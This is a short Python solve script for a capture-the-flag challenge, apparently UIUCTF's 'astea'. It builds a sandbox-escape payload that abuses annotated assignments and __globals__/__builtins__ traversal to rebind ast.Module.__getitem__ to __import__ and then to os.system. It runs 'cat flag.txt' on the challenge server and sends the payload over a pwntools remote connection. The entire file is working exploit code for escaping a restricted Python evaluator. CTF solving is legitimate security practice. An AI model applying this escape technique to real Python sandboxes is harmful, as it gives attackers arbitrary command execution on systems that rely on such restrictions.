import subprocess

from pwn import remote

payload = ""


def set_func(func: str):
    global payload
    payload += f"safe_import.__globals__['ast'].Module.__getitem__: 1 = {func};"


set_func("safe_import.__builtins__['__import__']")
payload += "os: 1 = safe_import.__globals__['cup']['os'];"
set_func("os.system")
payload += "safe_call.__globals__['cup']['cat flag.txt'];"

# subprocess.run(["python", "chal.py"], input=payload.encode())
r = remote("astea.chal.uiuc.tf", 1337, ssl=True)
r.sendline(payload.encode())
r.interactive()
